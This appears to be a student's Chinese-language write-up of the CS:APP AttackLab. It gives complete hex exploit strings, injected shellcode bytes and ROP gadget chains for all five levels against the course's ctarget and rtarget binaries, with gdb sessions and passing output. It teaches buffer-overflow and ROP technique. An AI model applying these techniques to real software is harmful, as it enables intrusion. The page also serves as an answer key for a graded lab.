<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
        Document
    </title>
    <link rel='stylesheet' href=../../../css/prism.css /><link rel='stylesheet' href=../../../css/index.css />
    <link rel="icon" href="https://raw.githubusercontent.com/learner-lu/picbed/master/logo.png">
</head>

<body class="light">
    <a href="https://github.com/luzhixing12345/csapplab.git" target="_blank" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
    <div class="header-navigator"><ul><li><a href="#h1-0">AttackLab</a><ul><li><a href="#h2-1">基本知识</a></li></ul><ul><li><a href="#h2-2">实验报告</a><ul><li><a href="#h3-3">Level1</a></li></ul><ul><li><a href="#h3-4">Level2</a></li></ul><ul><li><a href="#h3-5">Level3</a></li></ul><ul><li><a href="#h3-6">Level4</a></li></ul><ul><li><a href="#h3-7">Level5</a></li></ul></li></ul></li></ul></div><div class='markdown-body'><h1 id="h1-0">AttackLab</h1><h2 id="h2-1">基本知识</h2><p>Attack lab考察的是对缓冲区溢出攻击的理解,x86_64结构以及gdb调试</p><p>解压之后可以看到五个文件</p><ul><li>README.txt 工具的用途介绍</li></ul><ul><li>cookie.txt 作为个人学习者使用的密钥 <code>0x59b997fa</code></li></ul><ul><li>ctarget 123关攻击的对象,代码注入攻击</li></ul><ul><li>rtarget 45关攻击的对象,返回值攻击</li></ul><ul><li>farm.c 小工具农场,我们会在45关中利用这里的汇编字节码</li></ul><ul><li>hex2raw 十六进制转字符串,由于部分字节数据是无法通过键盘输入的(比如0x00),这个工具可以将文件中的十六进制数据转为字符串然后输入</li></ul><blockquote><p>相关gdb调试命令和x86_64参数传递等基础知识请参阅BombLab的内容,不再赘述</p></blockquote><p><b>请注意!</b> 如果运行 <code>./ctarget -q</code> 没有进入输入环节,而是报错 Segmentation fault, 那么有可能是因为 WSL2 的问题, 我使用的是 WSL2 ubuntu2204, 会有这个问题. 换一个</p><h2 id="h2-2">实验报告</h2><p>本次实验五关是需要根据实验的文档来依次解决的,开始之前请仔细阅读文档</p><h3 id="h3-3">Level1</h3><p>test 函数较为清晰,即接收 <code>getbuf</code> 的返回值并输出</p><pre><code class="language-c">void test() {
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}</code></pre><p>那么主要就是查看<code>getbuf</code> 函数,使用 <code>gdb ctarget</code> <code>disas getbuf</code> 可以看到其汇编代码</p><pre><code class="language-txt">0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp
0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi
0x00000000004017af &lt;+7&gt;:     callq  0x401a40 &lt;Gets&gt;
0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax
0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp
0x00000000004017bd &lt;+21&gt;:    retq</code></pre><p>这里可以看出来分配了0x28大小的栈空间,也就是40字节,接着调用了Gets函数</p><p>所以目前栈中的情况如下</p><p><img src="https://raw.githubusercontent.com/learner-lu/picbed/master/20221110211517.png" alt="20221110211517"></p><p>所以如果我们希望返回到 <code>touch1</code> 的位置,只需要制造缓冲区溢出覆盖返回地址即可,可以找到 <code>touch1</code> 的起始地址 <code>0x00000000004017c0</code></p><pre><code class="language-txt">(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 &lt;+0&gt;:     sub    $0x8,%rsp
   ...</code></pre><p>所以我们只需要构造一个前40个字节任意,后8字节为该地址的代码注入即可.同时注意小端存储,即低字节保存在低地址处</p><p>所以第一关的答案为</p><pre><code class="language-txt">00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
c0 17 40 00</code></pre><pre><code class="language-bash">root@da1811a84ddc:~/csapp/03Attack Lab/target1# ./hex2raw &lt; 1.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00</code></pre><blockquote><p>注意运行时应带上<code>-q</code>参数表示不提交给服务器,同时使用管道符利用<code>hex2raw</code>工具</p></blockquote><p>这里有一个小细节,touch1函数地址完整写法应该是</p><pre><code class="language-txt">c0 17 40 00 00 00 00 00</code></pre><p>后四字节(即高四字节的00 00 00 00)可以省略</p><p>虽然原先返回地址也是0x0040开头的,但是后面的两字节 <code>40 00</code> 并不能省略,准确来说<code>00</code>也可以省略但是<code>40</code>不能省略.</p><p>我个人推测有可能是零扩展的原因,不过阅读Gets的汇编源码并没有解决这个问题</p><h3 id="h3-4">Level2</h3><p>第二关的任务是返回到<code>touch2</code>,并且传入的参数val==cookie的值</p><p>显然跳转的过程很容易,但是如果想传入参数,即给rdi赋值那肯定是无法通过简单的栈溢出来做到,我们需要汇编的帮助</p><p>先阅读 <code>touch2</code>汇编确定传入的参数放在 <code>rdi</code>中</p><pre><code class="language-txt">(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec &lt;+0&gt;:     sub    $0x8,%rsp
   0x00000000004017f0 &lt;+4&gt;:     mov    %edi,%edx
   0x00000000004017f2 &lt;+6&gt;:     movl   $0x2,0x202ce0(%rip)        # 0x6044dc &lt;vlevel&gt;
   0x00000000004017fc &lt;+16&gt;:    cmp    0x202ce2(%rip),%edi        # 0x6044e4 &lt;cookie&gt;</code></pre><p>根据提示我们可以利用溢出将返回地址指向栈的地址,然后再栈中执行如下汇编代码即可</p><pre><code class="language-x86asm">mov $0x59b997fa, %rdi # 赋值val
push $0x4017ec        # touch2 地址
ret</code></pre><p>所以现在需要打断点确定rsp的值,这里就在调用 <code>Gets</code> 函数调用前打一个断点</p><pre><code class="language-bash">(gdb) b *0x4017af
Breakpoint 1 at 0x4017af: file buf.c, line 14.
(gdb) r -q
Starting program: /root/csapp/03Attack Lab/target1/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, 0x00000000004017af in getbuf () at buf.c:14
14      buf.c: No such file or directory.
(gdb) info r rsp
rsp            0x5561dc78       0x5561dc78</code></pre><p>得到输入时栈指针的值是 <code>0x5561dc78</code>, 也就是应该使用栈溢出覆盖的返回地址</p><p>接着使用gcc得到汇编对应的字节码</p><pre><code class="language-bash">gcc -c 2.s
objdump -d 2.o &gt; 2.d</code></pre><p>可以得到如下的 <code>2.d</code></p><pre><code class="language-txt">2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq</code></pre><p>由于指令的执行是低地址到高地址的,而我们输入的时候也是从低地址向高地址输入的,所以这里并不需要逆序</p><p>调用过程如下图所示</p><p><img src="https://raw.githubusercontent.com/learner-lu/picbed/master/20221110224424.png" alt="20221110224424"></p><p>所以本关答案为</p><pre><code class="language-txt">48 c7 c7 fa 97 b9 59 68 ec 17
40 00 c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55</code></pre><pre><code class="language-bash">root@da1811a84ddc:~/csapp/03Attack Lab/target1# ./hex2raw &lt; 2.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55</code></pre><h3 id="h3-5">Level3</h3><p>第三关需要调用 <code>touch3</code>,同时参数是一个字符串的地址,这个字符串是我们的cookie</p><p>与上一关不同是这里需要存储一个字符串,并且将首地址放入rdi,而不是直接给rdi赋值</p><p>那么我们就应该把这个字符串存放在栈中,可以放在40个字节这个空间中也可以放在返回地址更高地址的地方</p><p>但实际上并不能放在40个字节这个空间中,因为可以通过反汇编查看到 <code>touch3</code> <code>hexmatch</code> 函数进行了多次的压栈操作</p><pre><code class="language-txt">(gdb) disas touch3
Dump of assembler code for function touch3:
   0x00000000004018fa &lt;+0&gt;:     push   %rbx
   0x00000000004018fb &lt;+1&gt;:     mov    %rdi,%rbx
   0x00000000004018fe &lt;+4&gt;:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc &lt;vlevel&gt;
   0x0000000000401908 &lt;+14&gt;:    mov    %rdi,%rsi
   0x000000000040190b &lt;+17&gt;:    mov    0x202bd3(%rip),%edi        # 0x6044e4 &lt;cookie&gt;
   0x0000000000401911 &lt;+23&gt;:    callq  0x40184c &lt;hexmatch&gt;
   ...
(gdb) disas hexmatch
Dump of assembler code for function hexmatch:
   0x000000000040184c &lt;+0&gt;:     push   %r12
   0x000000000040184e &lt;+2&gt;:     push   %rbp
   0x000000000040184f &lt;+3&gt;:     push   %rbx
   0x0000000000401850 &lt;+4&gt;:     add    $0xffffffffffffff80,%rsp
   ...</code></pre><p>touch3中push一次,callq一次,hexmatch中push3次. 这样就已经挤占了0x28的空间,显然即使将字符串保存在0x28位置的栈中也会由于后续的压栈操作而被覆盖,所以我们考虑将这个字符串保存到更高地址的位置</p><p>我们首先将cookie转换字符串,并且输出其ASCII的值</p><pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
int main() {
    char *str = "59b997fa";
    for (int i=0;i&lt;strlen(str);i++) printf("%x ",str[i]);
    printf("\n");
    return 0;
}</code></pre><p>不要忘记最后的字符串结尾是 <code>\0</code>,即0x00,所以cookie的字符串形式对应的十六进制如下</p><pre><code class="language-bash">35 39 62 39 39 37 66 61 00</code></pre><p>接下来我们需要计算这个字符串应该放到哪里,它的地址就应该是 rsp+0x28+0x8 = 0x5561dc78+0x30 = <code>0x5561dca8</code></p><p>然后得到 <code>touch3</code> 的地址为 <code>0x4018fa</code></p><p>所以需要修改之前的注入汇编代码</p><pre><code class="language-x86asm">mov $0x5561dca8,%rdi
push $0x4018fa
ret</code></pre><p>得到汇编对应的字节码</p><pre><code class="language-txt">3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   7:   68 fa 18 40 00          pushq  $0x4018fa
   c:   c3                      retq</code></pre><p>整个调用过程如图所示</p><p><img src="https://raw.githubusercontent.com/learner-lu/picbed/master/20221110231552.png" alt="20221110231552"></p><p>所以可以得到本关答案</p><pre><code class="language-txt">48 c7 c7 a8 dc 61 55 68 fa 18
40 00 c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 00</code></pre><pre><code class="language-bash">root@da1811a84ddc:~/csapp/03Attack Lab/target1# ./hex2raw &lt; 3.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00</code></pre><h3 id="h3-6">Level4</h3><p>前三关使用的是代码注入的方式,但现在这种方式已经不行了,因为加入了两种技术</p><ul><li>栈地址随机初始化,这使得每一次运行程序得到的栈地址都不相同,所以不能像之前一样准确的定位到某一个地址开始执行代码</li></ul><ul><li>栈空间不可执行,这使得即使注入了攻击代码,当rip跳转到栈中试图执行代码时也会出现段错误导致失败</li></ul><p>但是所谓道高一尺魔高一丈,我们可以利用返回值来进行攻击(ROP)</p><p>返回值攻击是利用了程序中已知的字节码,大多是由一两条指令跟着一个ret,举一个例子,假设有如下函数</p><pre><code class="language-c">void setval_210(unsigned *p) {
    *p = 3347663060U;
}</code></pre><p>看起来这个函数不知所云,其汇编代码如下</p><pre><code class="language-txt">0000000000400f15 &lt;setval_210&gt;:
  400f15: c7 07 d4 48 89 c7         movl $0xc78948d4,(%rdi)
  400f1b: c3 retq</code></pre><p>但是如果我们对照汇编字节码指令的表格,就可以发现第一行后三个字节码 <code>48 89 c7</code> 相当于指令 <code>mov %rax,rdi</code></p><p><img src="https://raw.githubusercontent.com/learner-lu/picbed/master/20221110232817.png" alt="20221110232817"></p><p>那么这就给我们提供了一种思路,通常来说一个正常函数得到的汇编指令不会在最后几行是比如 <code>popq %rdi</code> <code>mov %rax,rdi</code> 然后ret返回</p><p>正常从 <code>0x400f15</code> 调用此函数没什么意义,但是如果从 <code>0x400f18</code> 开始调用,那么这段汇编相当于</p><pre><code class="language-txt">0000000000400f18 &lt;attack method!!!&gt;:
  400f18: 48 89 c7         movl %rax,%rdi
  400f1b: c3 retq</code></pre><p>那么我们就可以利用这种漏洞来进行攻击</p><p>文件 <code>farm.c</code> 就提供了这样一组函数"农场",它们看起来不知所云,但是汇编的字节码充满着可以攻击的手段.我们的任务就是利用这些返回值来攻击</p><hr><p>那回到本题,要求是再去执行 <code>touch2</code>, 也就是说我们只需要跳转到 <code>touch2</code> 的地址,并且将我们的cookie赋值给 %rdi 即可</p><p>查找汇编对应的字节码可以使用如下指令将整个程序反汇编保存到 <code>asm.txt</code> 中,然后在vim中查询</p><pre><code class="language-bash">objdump -d rtarget &gt; asm.txt</code></pre><p>vim中查询高亮明显可以使用 <code>set hlsearch</code> 使选中的高亮</p><p>那么赋值操作显然是popq,最理想的就是直接将栈中保存的值<code>0x59b997fa</code> 通过 <code>popq %rdi</code> 赋值给rdi,但是找不到对应的字节码(5f)在合理的位置</p><p>但是我们可以找到 <code>popq rax</code>(0x58),后面的(0x90)是nop空指令</p><pre><code class="language-txt">00000000004019a7 &lt;addval_219&gt;:
  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:       c3                      retq</code></pre><p>调用的地址为 <code>0x4019ab</code></p><p>接着将rax赋值给rdi,即寻找 <code>48 89 c7</code></p><pre><code class="language-txt">00000000004019a0 &lt;addval_273&gt;:
  4019a0:       8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:       c3                      retq</code></pre><p>调用的地址为 <code>0x4019a2</code></p><p>最后再返回到 <code>touch2</code> 的地址 <code>0x4017ec</code> 即可</p><p>整个调用过程如下图</p><p><img src="https://raw.githubusercontent.com/learner-lu/picbed/master/20221110235850.png" alt="20221110235850"></p><p>所以答案为</p><pre><code class="language-txt">00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00</code></pre><pre><code class="language-bash">root@da1811a84ddc:~/csapp/03Attack Lab/target1# ./hex2raw  &lt; 4.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</code></pre><h3 id="h3-7">Level5</h3><p>最后一关是去调用 <code>touch3</code>, 并且传入一个参数rdi是cookie的字符串的首地址</p><p>那么我们可以分析一下,这个字符串一定是保存在栈中的,也就是整个栈的最上面.那么我们需要在某一个时刻获取rsp,然后利用rsp+bias获取到起始地址,并且将这个地址赋给rdi即可</p><p>非常幸运的是我们可以在 <code>farm.c</code> 中找到这样一个函数</p><pre><code class="language-c">long add_xy(long x, long y)
{
    return x+y;
}</code></pre><p>其汇编如下,也就是说我们需要把rsp赋值给rdi,然后把bias赋值给rsi,这样就得到了最终的字符串首地址,把rax再赋值给rdi即可</p><pre><code class="language-txt">00000000004019d6 &lt;add_xy&gt;:
  4019d6:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  4019da:       c3                      retq</code></pre><p>这里的bias我们现在不能确定,应该是整个流程需要的指令数量确定了之后才可以计算出来</p><p>那么整个思路其实已经比较清晰了,只需要再对着这个表格搜索需要的就可以了</p><blockquote><p>注意使用 movl 以及后面如果是双字节的nop指令(andb/orb)也可以利用</p></blockquote><p>本题答案唯一,只使用farm.c中的函数没有其他的走法,寄存器的转移是固定的,这里就不再一一分析了,直接给出本题答案</p><p>整个过程调用如下图所示</p><p><img src="https://raw.githubusercontent.com/learner-lu/picbed/master/20221111002949.png" alt="20221111002949"></p><p>由此可以计算出 bias 的值应该为 <code>0x48</code></p><p>所以本题答案为</p><pre><code class="language-txt">00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61 00</code></pre><pre><code class="language-bash">root@da1811a84ddc:~/csapp/03Attack Lab/target1# ./hex2raw &lt; 5.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</code></pre></div>
    <div class="dir-tree"><ul><li><a href="../../md-docs/README" >README</a></li></ul><ul><li><a href="../../md-docs/01-DataLab" >01-DataLab</a></li></ul><ul><li><a href="../../md-docs/02-BombLab" >02-BombLab</a></li></ul><ul><li><a href="../../md-docs/03-AttackLab" >03-AttackLab</a></li></ul><ul><li><a href="../../md-docs/04-BufferLab" >04-BufferLab</a></li></ul><ul><li><a href="../../md-docs/05-ArchLab" >05-ArchLab</a></li></ul><ul><li><a href="../../md-docs/06-ArchY86Lab" >06-ArchY86Lab</a></li></ul><ul><li><a href="../../md-docs/07-CacheLab" >07-CacheLab</a></li></ul><ul><li><a href="../../md-docs/08-PerfLab" >08-PerfLab</a></li></ul><ul><li><a href="../../md-docs/09-ShellLab" >09-ShellLab</a></li></ul><ul><li><a href="../../md-docs/10-MallocLab" >10-MallocLab</a></li></ul><ul><li><a href="../../md-docs/11-ProxyLab" >11-ProxyLab</a></li></ul></div>
    <div class="zood"><a class="" href="https://github.com/luzhixing12345/zood" target="_blank">zood</a></div>
    <script type="text/javascript" src="../../../js/next_front.js"></script><script>addLink("../../md-docs/02-BombLab","../../md-docs/04-BufferLab","ab")</script><script type="text/javascript" src="../../../js/change_mode.js"></script><script>addChangeModeButton("../../../img/sun.png","../../../img/moon.png")</script><script type="text/javascript" src="../../../js/copy_code.js"></script><script>addCodeCopy("../../../img/before_copy.png","../../../img/after_copy.png")</script><script type="text/javascript" src="../../../js/navigator.js"></script><script type="text/javascript" src="../../../js/prism.js"></script><script type="text/javascript" src="../../../js/picture_preview.js"></script><script type="text/javascript" src="../../../js/check_box.js"></script>
</body>

</html>